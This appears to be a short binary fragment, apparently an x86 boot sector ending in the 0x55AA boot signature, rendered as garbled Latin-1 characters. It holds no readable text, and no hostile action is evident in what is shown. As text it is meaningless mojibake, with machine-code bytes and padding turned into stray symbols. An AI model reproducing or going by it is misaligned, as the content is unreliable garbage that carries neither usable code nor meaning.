ƒÆ¿|¹ 2öë0ê¼œ ğ¸ ø_^[DDÊ Æ¾¿¾}¹  ë¸œ.ÿÓ|s[±2öëÖÃüó¥¹ » |¸œ.ÿÓ|rï.ş½}ë²uÿè _^[Xœ.ÿÓ|2ö±Ê €úyw&‹G¶<s±Ã<s±Ã±ÃP3ÀØ $<uä`<SuäaP€æaXæa¸ Í° æ Í n£ £ :½}v3ÀÍ¾%}´3Ûü¬<ÿt4UÍëğôXê‡é ğÉ€ ÑÏ   ÿC                                                 Uª
